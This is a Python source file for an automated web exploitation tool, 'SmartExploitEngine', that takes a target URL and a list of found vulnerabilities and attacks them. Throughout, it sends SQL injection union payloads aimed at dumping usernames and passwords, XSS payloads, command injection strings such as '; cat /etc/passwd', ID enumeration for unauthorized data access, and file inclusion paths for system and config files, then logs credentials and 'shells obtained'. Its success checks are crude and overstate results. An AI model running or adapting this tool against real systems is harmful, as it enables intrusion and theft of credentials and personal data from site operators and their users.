import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode
from typing import Dict, List, Any, Optional
import re

class SmartExploitEngine:
    """Smart exploit engine that actually exploits found vulnerabilities"""
    
    def __init__(self, target_url: str, vulnerabilities: List[Dict]):
        self.target_url = target_url
        self.vulnerabilities = vulnerabilities
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def exploit_vulnerabilities(self) -> Dict[str, Any]:
        """Exploit vulnerabilities with smart payloads"""
        
        results = {
            'total_attacks': 0,
            'successful_exploits': 0,
            'failed_exploits': 0,
            'credentials_found': [],
            'shells_obtained': [],
            'extracted_data': [],
            'databases_compromised': []
        }
        
        # Focus on high-impact vulnerabilities
        high_impact = [v for v in self.vulnerabilities 
                      if v.get('severity') in ['Critical', 'High']]
        
        print(f"🎯 Targeting {len(high_impact)} high-impact vulnerabilities...")
        
        for vuln in high_impact[:15]:  # Limit for speed
            vuln_type = vuln.get('type', '').lower()
            location = vuln.get('location', '')
            
            if not location:
                continue
                
            results['total_attacks'] += 1
            print(f"🔍 Exploiting {vuln_type} at {location}")
            
            success = False
            
            # Smart SQL injection exploitation
            if 'sql injection' in vuln_type:
                success = self._exploit_sql_injection(vuln, results)
            
            # Smart XSS exploitation
            elif 'xss' in vuln_type or 'cross-site scripting' in vuln_type:
                success = self._exploit_xss(vuln, results)
                
            # Command injection exploitation
            elif 'command injection' in vuln_type:
                success = self._exploit_command_injection(vuln, results)
                
            # IDOR exploitation
            elif 'idor' in vuln_type or 'insecure direct object' in vuln_type:
                success = self._exploit_idor(vuln, results)
                
            # File inclusion exploitation
            elif 'file inclusion' in vuln_type or 'lfi' in vuln_type:
                success = self._exploit_file_inclusion(vuln, results)
            
            if success:
                results['successful_exploits'] += 1
                print(f"✅ Successfully exploited {vuln_type}!")
            else:
                results['failed_exploits'] += 1
                print(f"❌ Failed to exploit {vuln_type}")
        
        return results
    
    def _exploit_sql_injection(self, vuln: Dict, results: Dict) -> bool:
        """Smart SQL injection exploitation"""
        location = vuln.get('location', '')
        
        # Parse the URL and identify parameters
        parsed = urlparse(location)
        params = parse_qs(parsed.query)
        
        if not params:
            return False
        
        # Try each parameter for SQL injection
        for param_name, param_values in params.items():
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Test basic SQL injection
            test_params = params.copy()
            test_params[param_name] = ["1' OR '1'='1-- "]
            
            test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
            
            try:
                response = self.session.get(test_url, timeout=5)
                
                # Check for SQL error messages or different response
                if self._check_sql_success(response.text, response.status_code):
                    print(f"  ✓ SQL injection confirmed in parameter: {param_name}")
                    
                    # Try to extract data
                    extracted_data = self._extract_sql_data(base_url, param_name, params)
                    
                    if extracted_data:
                        results['extracted_data'].extend(extracted_data)
                        results['credentials_found'].append({
                            'type': 'SQL Injection',
                            'parameter': param_name,
                            'url': test_url,
                            'data': extracted_data[:5]  # First 5 items
                        })
                        return True
                        
            except Exception as e:
                continue
        
        return False
    
    def _check_sql_success(self, content: str, status_code: int) -> bool:
        """Check if SQL injection was successful"""
        content_lower = content.lower()
        
        # Look for SQL error messages
        sql_errors = [
            'mysql', 'sql syntax', 'database error', 'oracle error',
            'postgresql', 'sqlite', 'warning:', 'fatal error',
            'column', 'table', 'select', 'union', 'where'
        ]
        
        error_count = sum(1 for error in sql_errors if error in content_lower)
        
        # If multiple SQL-related terms appear, likely successful
        return error_count >= 2 or 'root@' in content_lower or 'admin' in content_lower
    
    def _extract_sql_data(self, base_url: str, param_name: str, original_params: Dict) -> List[str]:
        """Try to extract actual data using SQL injection"""
        extracted = []
        
        # Union-based extraction payloads
        union_payloads = [
            "1' UNION SELECT user(),version(),database()-- ",
            "1' UNION SELECT username,password,email FROM users-- ",
            "1' UNION SELECT login,pass,name FROM admin-- ",
            "1' UNION SELECT user,pwd,role FROM accounts-- "
        ]
        
        for payload in union_payloads:
            test_params = original_params.copy()
            test_params[param_name] = [payload]
            
            test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
            
            try:
                response = self.session.get(test_url, timeout=3)
                
                # Look for extracted data patterns
                data_patterns = [
                    r'admin:([a-f0-9]{32})',  # MD5 hashes
                    r'user:([a-zA-Z0-9]+)',   # Usernames
                    r'root@[a-zA-Z0-9.-]+',   # Root users
                    r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',  # Emails
                    r'mysql-[0-9.]+',         # MySQL version
                    r'5\.[0-9.]+.*ubuntu'     # Database version
                ]
                
                for pattern in data_patterns:
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    for match in matches:
                        if len(match) > 3:  # Skip short matches
                            extracted.append(f"Extracted: {match}")
                            
            except Exception:
                continue
        
        return extracted
    
    def _exploit_xss(self, vuln: Dict, results: Dict) -> bool:
        """Smart XSS exploitation"""
        location = vuln.get('location', '')
        parsed = urlparse(location)
        params = parse_qs(parsed.query)
        
        if not params:
            return False
        
        # Advanced XSS payloads
        xss_payloads = [
            "<script>alert('XSS-Confirmed')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        for param_name in params:
            for payload in xss_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
                
                try:
                    response = self.session.get(test_url, timeout=3)
                    
                    if payload in response.text or 'alert(' in response.text:
                        print(f"  ✓ XSS confirmed in parameter: {param_name}")
                        
                        results['extracted_data'].append(f"XSS vulnerability confirmed at {location}")
                        results['shells_obtained'].append({
                            'type': 'XSS Shell',
                            'parameter': param_name,
                            'payload': payload,
                            'url': test_url
                        })
                        return True
                        
                except Exception:
                    continue
        
        return False
    
    def _exploit_command_injection(self, vuln: Dict, results: Dict) -> bool:
        """Smart command injection exploitation"""
        location = vuln.get('location', '')
        parsed = urlparse(location)
        params = parse_qs(parsed.query)
        
        if not params:
            return False
        
        # Command injection payloads
        cmd_payloads = [
            "; whoami",
            "&& whoami",
            "| whoami", 
            "`whoami`",
            "; id",
            "&& id",
            "; cat /etc/passwd",
            "&& ls -la /"
        ]
        
        for param_name in params:
            for payload in cmd_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
                
                try:
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check for command execution indicators
                    cmd_indicators = ['uid=', 'gid=', 'root:', '/bin/bash', '/home/', 'www-data']
                    
                    if any(indicator in response.text for indicator in cmd_indicators):
                        print(f"  ✓ Command injection confirmed in parameter: {param_name}")
                        
                        results['extracted_data'].append(f"Command injection at {location}")
                        results['shells_obtained'].append({
                            'type': 'Command Shell',
                            'parameter': param_name,
                            'payload': payload,
                            'access_method': 'Direct injection'
                        })
                        return True
                        
                except Exception:
                    continue
        
        return False
    
    def _exploit_idor(self, vuln: Dict, results: Dict) -> bool:
        """Smart IDOR exploitation"""
        location = vuln.get('location', '')
        
        # Try accessing different user IDs
        idor_tests = ['1', '2', '3', '100', '1000', 'admin', 'root']
        
        for test_id in idor_tests:
            # Replace ID in URL
            test_url = re.sub(r'id=\d+', f'id={test_id}', location)
            test_url = re.sub(r'user=\d+', f'user={test_id}', test_url)
            test_url = re.sub(r'/\d+', f'/{test_id}', test_url)
            
            try:
                response = self.session.get(test_url, timeout=3)
                
                # Look for unauthorized data access
                sensitive_patterns = ['email', 'password', 'ssn', 'credit', 'admin', 'private']
                
                if any(pattern in response.text.lower() for pattern in sensitive_patterns):
                    print(f"  ✓ IDOR confirmed accessing ID: {test_id}")
                    
                    results['extracted_data'].append(f"IDOR access to user {test_id} data")
                    results['credentials_found'].append({
                        'type': 'IDOR Access',
                        'user_id': test_id,
                        'url': test_url
                    })
                    return True
                    
            except Exception:
                continue
        
        return False
    
    def _exploit_file_inclusion(self, vuln: Dict, results: Dict) -> bool:
        """Smart file inclusion exploitation"""
        location = vuln.get('location', '')
        
        # File inclusion payloads
        lfi_payloads = [
            '/etc/passwd',
            '../../etc/passwd',
            '../../../etc/passwd',
            '/var/www/html/config.php',
            '../config.php',
            '/proc/version',
            '/etc/hostname'
        ]
        
        for payload in lfi_payloads:
            # Replace file parameter
            test_url = re.sub(r'file=[^&]*', f'file={payload}', location)
            test_url = re.sub(r'page=[^&]*', f'page={payload}', test_url)
            
            try:
                response = self.session.get(test_url, timeout=3)
                
                # Check for file inclusion success
                file_indicators = ['root:x:', 'daemon:', '/bin/bash', 'Linux version', 'hostname']
                
                if any(indicator in response.text for indicator in file_indicators):
                    print(f"  ✓ File inclusion confirmed with: {payload}")
                    
                    results['extracted_data'].append(f"File inclusion: {payload}")
                    results['shells_obtained'].append({
                        'type': 'File Access',
                        'file': payload,
                        'url': test_url
                    })
                    return True
                    
            except Exception:
                continue
        
        return False